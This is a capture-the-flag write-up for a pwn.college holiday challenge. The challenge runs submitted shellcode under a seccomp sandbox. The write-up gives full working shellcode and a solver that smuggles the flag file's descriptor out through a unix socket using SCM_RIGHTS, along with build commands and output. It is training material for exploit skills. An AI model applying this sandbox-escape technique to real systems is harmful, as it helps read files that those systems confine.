# Challenge 10
## Description

```
TOWER → SLEIGH:
    Tower to Sleigh, do you copy? Your position reports are no longer
    matching our tracking. Please confirm your heading.

SLEIGH → TOWER:
    Copy, Tower. Conditions have changed. We’ve lost our reference
    point in the upper air. Instruments aren’t updating. The aurora is
    shifting unpredictably, and the reindeer teams are holding, but only just.

TOWER → SLEIGH:
    Sleigh, we show you drifting toward restricted airspace. You need
    to correct immediately. Stand by while we review the guidance
    archive.

SLEIGH → TOWER:
    Tower, we need that reference now. Without it, we can’t plot a
    safe course forward. Everything up here looks identical—especially
    with the aurora washing out our visual markers.

TOWER → SLEIGH:
    Understood. Accessing the archive… negative. The flag is not
    present. Without it, we cannot compute your corrective vector.

SLEIGH → TOWER:
    Tower, control is degrading. We cannot hold this altitude much
    longer. If you have the flag, transmit it immediately—it's the
    only data that will get Santa safely through this corridor.

[static begins to rise]

TOWER:
    Sleigh, your signal is breaking. Repeat your last transmission.

[static overtakes the channel]

TOWER:
    Sleigh, do you read? Respond.

[silence]

TOWER:
    We've lost contact.

    Whoever is still listening on this frequency:
    the flag is our only means of restoring guidance.
    Recover it and return it on this channel.

    Santa’s counting on you.
```

## Analysis

This challenge is similar to [Challenge 5](../challenge5), in the sense that we provide a
4KiB shellcode and it is executed under a seccomp-bpf sandbox. This time the
sandbox only allows `openat`, `sendmsg`, and `recvmsg`.

We can use `openat` to open the flag, but we can't use `sendmsg` or `recvmsg`
to interact with that file descriptor directly: they only work on sockets.
However, we can pass sockets as file descriptors to the binary that are not
closed after `exec`.

`sendmsg` and `recvmsg` provide a way to send control informatio as ancilliary
data. In particular, for unix sockets we can pass references to file
descriptors via `SCM_RIGHTS`. This means that we can pass around the file
descriptor for the flag.

More information about sending fds in unix sockets can be found in the `unix`
socket manpage. An example of this can be found in the `seccomp_unitify` man
page.

Challenge source code:

```c
#include <errno.h>
#include <seccomp.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>

#define SANTA_FREQ_ADDR (void *)0x1225000

int setup_sandbox()
{
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != 0) {
        perror("prctl(NO_NEW_PRIVS)");
        return 1;
    }

    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
    if (!ctx) {
        perror("seccomp_init");
        return 1;
    }

    if (seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(openat), 0) < 0 ||
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(recvmsg), 0) < 0 ||
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendmsg), 0) < 0 ||
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0) < 0) {
        perror("seccomp_rule_add");
        return 1;
    }

    if (seccomp_load(ctx) < 0) {
        perror("seccomp_load");
        return 1;
    }

    seccomp_release(ctx);

    return 0;
}

int main(int argc, char *argv[])
{
    puts("📡 Tuning to Santa's reserved frequency...");
    void *code = mmap(SANTA_FREQ_ADDR, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (code != SANTA_FREQ_ADDR) {
        perror("mmap");
        return 1;
    }

    puts("💾 Loading incoming elf firmware packet...");
    if (read(0, code, 0x1000) < 0) {
        perror("read");
        return 1;
    }

    puts("🧝 Protecting station from South Pole elfs...");
    if (setup_sandbox() != 0) {
        perror("setup_sandbox");
        return 1;
    }

    // puts("🎙️ Beginning uplink communication...");
    ((void (*)())(code))();

    // puts("❄️ Uplink session ended.");
    return 0;
}
```

## Solution

To solve this, we will need two pieces: on one hand, a program that creates the
unix sockets and invokes the challenge with the payload and the unix socket in
a file descriptor, and the shellcode challenge that opens the flag and sends it
over the socket with `sendmsg`.

### Shellcode

First, all the boilerplate, `memcpy`, `memset`, and syscalls wrappers:
```c
#define _GNU_SOURCE

#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>

#define ALWAYS_INLINE [[clang::always_inline]] inline
#define SOCKET_FILENO (101)

typedef unsigned short umode_t;

ALWAYS_INLINE void *memset(void *src, int val, size_t num) {
  char v = val & 0xff;
  uint8_t *data = (uint8_t *)src;

  __asm__ volatile("rep stosb\n" : "+D"(data), "+c"(num) : "a"(v) : "memory");

  return src;
}

ALWAYS_INLINE void *memcpy(void *restrict dest, const void *restrict src,
                           size_t n) {
  void *data = dest;
  __asm__ volatile("rep movsb\n" : "+D"(data), "+S"(src), "+c"(n) : : "memory");
  return dest;
}

ALWAYS_INLINE int sys_openat(int dfd, const char *filename, int flags,
                             umode_t mode) {
  register mode_t r10_mode __asm__("r10") = mode;
  int ret;
  __asm__ volatile("syscall\n"
                   : "=a"(ret)
                   : "a"(__NR_openat), "D"(dfd), "S"(filename), "d"(flags),
                     "r"(r10_mode)
                   : "rcx", "r11", "memory");
  return ret;
}

ALWAYS_INLINE ssize_t sys_sendmsg(int fd, struct msghdr *msg, unsigned flags) {
  ssize_t ret;
  __asm__ volatile("syscall\n"
                   : "=a"(ret)
                   : "a"(__NR_sendmsg), "D"(fd), "S"(msg), "d"(flags)
                   : "rcx", "r11", "memory");
  return ret;
}

[[noreturn]] ALWAYS_INLINE int exit_group(int code) {
  __asm__ volatile("syscall\n"
                   :
                   : "a"(__NR_exit_group), "D"(code)
                   : "rcx", "r11", "memory");
  __builtin_unreachable();
}
```

The meat of the code is here (more or less copied from the man page example):

```c
[[gnu::section(".text.entry")]] void _start(void) {
  // /flag
  uint64_t flag_path = 0x0067616c662f;
  int fd = sys_openat(AT_FDCWD, (char *)&flag_path, O_RDONLY, 0);
  if (fd < 0) {
    exit_group(fd);
  }

  alignas(struct cmsghdr) char buf[CMSG_SPACE(sizeof(int))] = {};
  char dummy = 'x';

  struct iovec io = {
      .iov_base = &dummy,
      .iov_len = 1,
  };

  struct msghdr msg = {
      .msg_iov = &io,
      .msg_iovlen = 1,
      .msg_control = buf,
      .msg_controllen = sizeof(buf),
  };

  struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
  cmsg->cmsg_level = SOL_SOCKET;
  cmsg->cmsg_type = SCM_RIGHTS;
  cmsg->cmsg_len = CMSG_LEN(sizeof(int));
  memcpy(CMSG_DATA(cmsg), &fd, sizeof(int));

  ssize_t res = sys_sendmsg(SOCKET_FILENO, &msg, 0);
  if (res < 0) {
    exit_group((int)res);
  }

  exit_group(0);
}
```
This file can be found in [`./challenge10_payload.c`](./challenge10_payload.c)

Compiled with:

```bash
$ clang -Wall -Wextra -pedantic -std=c23 -Oz -g3 -gdwarf-5 -fno-builtin -fno-builtin-memset -ffreestanding -fpie -nostdlib -mno-sse -fno-jump-tables -Wl,--unique=.text.entry    challenge10.c   -o challenge10
```

And then, you need to extract the `.text.entry` contents:

```bash
$ objcopy --only-section=.text.entry -O binary ./challenge10 ./payload
```

### Solver

The solver creates a pair of unix sockets using `socketpair`, opens the
`payload` file, and then forks. The child does an `execve` on the challenge,
setting fd 0 (stdin) as the payload, and fd 101 as one end of the socket pair.

The parent code then calls `recvmsg` to receive the file descriptor from the
other end of the socket pair, and sends it to stderr for display.

```c
#include <assert.h>
#include <err.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/sendfile.h>
#include <sys/socket.h>
#include <unistd.h>

[[noreturn]] void child_process(int socket_fd, int stdin_fd) {
  if (dup2(socket_fd, 101) == -1) {
    err(EXIT_FAILURE, "dup2");
  }
  close(STDIN_FILENO);
  if (dup2(stdin_fd, 0) == -1) {
    err(EXIT_FAILURE, "dup2(stdin)");
  }

  char* argv[] = {"/challenge/northpole-relay", nullptr};
  char* envp[] = {nullptr};

  if (execve(argv[0], argv, envp) == -1) {
    err(EXIT_FAILURE, "execve");
  }
  __builtin_unreachable();
}

int main(void) {
  int sockets[2];
  if (socketpair(AF_UNIX, SOCK_STREAM, 0, sockets) == -1) {
    err(EXIT_FAILURE, "socketpair");
  }
  int payload_fd = open("./payload", O_RDONLY);
  if (payload_fd == -1) {
    err(EXIT_FAILURE, "open(payload)");
  }

  pid_t pid = fork();
  if (pid == -1) {
    err(EXIT_FAILURE, "fork");
  }
  if (pid == 0) {
    close(sockets[0]);
    child_process(sockets[1], payload_fd);
  }

  close(payload_fd);
  close(sockets[1]);

  alignas(struct cmsghdr) char buf[CMSG_SPACE(sizeof(int))] = {};
  char dummy = 'x';

  struct iovec io = {
      .iov_base = &dummy,
      .iov_len = 1,
  };

  struct msghdr msg = {
      .msg_iov = &io,
      .msg_iovlen = 1,
      .msg_control = buf,
      .msg_controllen = sizeof(buf),
  };

  ssize_t res = recvmsg(sockets[0], &msg, 0);
  if (res < 0) {
    err(EXIT_FAILURE, "recvmsg");
  }

  struct cmsghdr* cmsg = CMSG_FIRSTHDR(&msg);
  assert(cmsg != nullptr);
  assert(cmsg->cmsg_type == SCM_RIGHTS);
  int flag_fd = -1;
  memcpy(&flag_fd, CMSG_DATA(cmsg), sizeof(int));

  sendfile(STDERR_FILENO, flag_fd, 0, 0x1000);
  return 0;
}
```
This file can be found in [`./challenge10.c`](./challenge10.c)

Finally this can be all put together with:

```bash
#!/bin/bash

set -e

clang -Wall -Wextra -pedantic -std=c2x \
	-Oz -g3 -gdwarf-5 \
	-fno-builtin -fno-builtin-memset \
	-fpie -mno-sse -fno-jump-tables \
	challenge10.c -o challenge10

clang -Wall -Wextra -pedantic -std=c23 \
	-Oz -g3 -gdwarf-5 \
	-fno-builtin -fno-builtin-memset \
	-ffreestanding -fpie -nostdlib \
	-mno-sse -fno-jump-tables \
	-Wl,--unique=.text.entry \
	challenge10_payload.c   -o challenge10_payload

objcopy --only-section=.text.entry -O binary ./challenge10_payload ./payload

./challenge10 < payload
```

```
$ ./run.sh
📡 Tuning to Santa's reserved frequency...
💾 Loading incoming elf firmware packet...
🧝 Protecting station from South Pole elfs...
pwn.college{...}
```

